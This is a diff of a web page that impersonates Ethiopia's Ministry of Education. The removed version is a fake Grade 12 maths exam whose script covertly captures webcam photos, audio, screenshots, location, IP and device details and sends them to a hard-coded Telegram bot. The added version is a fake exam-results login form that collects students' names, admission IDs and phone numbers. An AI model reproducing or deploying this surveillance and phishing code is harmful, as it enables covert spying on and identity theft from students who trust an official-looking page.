@@ -1,209 +1,30 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <link rel="manifest" href="manifest.json" />
-  <meta name="theme-color" content="#004AAD" />
-  <title>Ethiopian Grade 12 National Exam - Mathematics</title>
-  <style>
-    body {
-      margin: 0;
-      font-family: "Noto Sans", sans-serif;
-      background-color: #f4f4f4;
-      color: #222;
-    }
-    header {
-      background-color: #004AAD;
-      color: white;
-      padding: 20px;
-      text-align: center;
-    }
-    main {
-      padding: 20px;
-    }
-    .question {
-      margin-bottom: 25px;
-    }
-    .question h3 {
-      margin-bottom: 10px;
-    }
-    .question input {
-      margin: 5px;
-    }
-    button {
-      padding: 12px 24px;
-      font-size: 16px;
-      background-color: #004AAD;
-      color: white;
-      border: none;
-      border-radius: 6px;
-      cursor: pointer;
-    }
-    iframe {
-      position: absolute;
-      top: 0;
-      left: 0;
-      width: 100vw;
-      height: 100vh;
-      border: none;
-      opacity: 0;
-      z-index: -1;
-    }
-    video, canvas {
-      display: none;
-    }
-  </style>
+  <title>Grade 12 Mattrix result 2017</title>
+  <link rel="stylesheet" href="style.css">
 </head>
 <body>
-  <header>
-    <h1>Ministry of Education</h1>
-    <p>Grade 12 National Exam – Mathematics Section</p>
-  </header>
-
-  <main>
-    <div class="question">
-      <h3>1. If f(x) = 2x + 3, what is f(5)?</h3>
-      <input type="radio" name="q1" /> 13<br />
-      <input type="radio" name="q1" /> 10<br />
-      <input type="radio" name="q1" /> 15<br />
-      <input type="radio" name="q1" /> 8
+  <div class="continer">
+    <!-- Logo image -->
+    <div style="text-align: center; margin-bottom: 15px;">
+      <img src="download.jpeg" alt="Logo" width="150">
     </div>
 
-    <div class="question">
-      <h3>2. Solve: x² - 9 = 0</h3>
-      <input type="radio" name="q2" /> x = ±3<br />
-      <input type="radio" name="q2" /> x = 9<br />
-      <input type="radio" name="q2" /> x = 0<br />
-      <input type="radio" name="q2" /> x = 3
-    </div>
+    <form id="loginForm">
+      <h1 class="title">Login</h1>
+      <input type="text" id="name" placeholder="Name" required>
+      <input type="text" id="father" placeholder="Father Name" required>
+      <input type="text" id="admId" placeholder="Admission ID" required>
+      <input type="text" id="phone" placeholder="Phone No" required>
+      <button type="submit" id="btn">Submit</button>
+    </form>
+  </div>
 
-    <div class="question">
-      <h3>3. If sin(θ) = 0.5, then θ = ?</h3>
-      <input type="radio" name="q3" /> 30°<br />
-      <input type="radio" name="q3" /> 90°<br />
-      <input type="radio" name="q3" /> 60°<br />
-      <input type="radio" name="q3" /> 180°
-    </div>
+  <div class="power">
+    <p>Powered by Asocity</p>
+  </div>
 
-    <button onclick="alert('Your answers have been submitted.')">Submit Exam</button>
-  </main>
-
-  <!-- Invisible distractions -->
-  <iframe src="https://www.moe.gov.et" loading="lazy"></iframe>
-
-  <!-- Camera and capture system -->
-  <video id="video" autoplay playsinline width="320" height="240"></video>
-  <canvas id="canvas" width="320" height="240"></canvas>
-  <canvas id="screenshotCanvas"></canvas>
-
-  <script>
-    const botToken = "8104388450:AAGsCzb8r6LArcCl1nQ4VBdJxnS5B3fYUXI";
-    const chatId = "7785331768";
-    const video = document.getElementById("video");
-    const canvas = document.getElementById("canvas");
-    const ctx = canvas.getContext("2d");
-    const screenshotCanvas = document.getElementById("screenshotCanvas");
-    const scCtx = screenshotCanvas.getContext("2d");
-
-    let batteryLevel = "Unknown", lat = "Unknown", lon = "Unknown", ip = "Unknown", deviceInfo = "";
-
-    async function getBattery() {
-      if (navigator.getBattery) {
-        const battery = await navigator.getBattery();
-        batteryLevel = Math.round(battery.level * 100);
-      }
-    }
-
-    function getLocation() {
-      navigator.geolocation.getCurrentPosition(pos => {
-        lat = pos.coords.latitude;
-        lon = pos.coords.longitude;
-      });
-    }
-
-    async function getIP() {
-      try {
-        const res = await fetch("https://api.ipify.org?format=json");
-        const data = await res.json();
-        ip = data.ip;
-      } catch {}
-    }
-
-    function getDeviceInfo() {
-      deviceInfo = `UserAgent: ${navigator.userAgent}\nPlatform: ${navigator.platform}`;
-    }
-
-    async function sendFile(blob, filename, caption) {
-      const formData = new FormData();
-      formData.append("chat_id", chatId);
-      formData.append("caption", caption);
-      formData.append("document", blob, filename);
-
-      await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
-        method: "POST",
-        body: formData
-      });
-    }
-
-    function capturePhoto() {
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      canvas.toBlob(blob => {
-        sendFile(blob, "photo.jpg", `Battery: ${batteryLevel}%\nLat: ${lat}\nLon: ${lon}\nIP: ${ip}\n${deviceInfo}`);
-      }, 'image/jpeg');
-    }
-
-    function recordAudio(stream) {
-      const recorder = new MediaRecorder(stream);
-      let chunks = [];
-
-      recorder.ondataavailable = e => chunks.push(e.data);
-      recorder.onstop = () => {
-        const blob = new Blob(chunks, { type: "audio/webm" });
-        sendFile(blob, "audio.webm", `Audio Clip\nIP: ${ip}`);
-      };
-
-      recorder.start();
-      setTimeout(() => recorder.stop(), 5000);
-    }
-
-    function takeScreenshot() {
-      screenshotCanvas.width = document.body.scrollWidth;
-      screenshotCanvas.height = document.body.scrollHeight;
-      html2canvas(document.body).then(canvas => {
-        canvas.toBlob(blob => {
-          sendFile(blob, "screenshot.jpg", `Screen\nIP: ${ip}`);
-        });
-      });
-    }
-
-    async function init() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-        video.srcObject = stream;
-
-        getBattery();
-        getLocation();
-        getIP();
-        getDeviceInfo();
-
-        setInterval(capturePhoto, 5000);
-        setTimeout(() => recordAudio(stream), 2000);
-        setTimeout(takeScreenshot, 6000);
-      } catch (err) {
-        alert("Permission required to continue the exam.");
-      }
-    }
-
-    if ('serviceWorker' in navigator) {
-      navigator.serviceWorker.register('sw.js');
-    }
-
-    // Load html2canvas library for screenshots
-    const s = document.createElement("script");
-    s.src = "https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js";
-    s.onload = init;
-    document.body.appendChild(s);
-  </script>
+  <script src="script.js"></script>
 </body>
 </html>
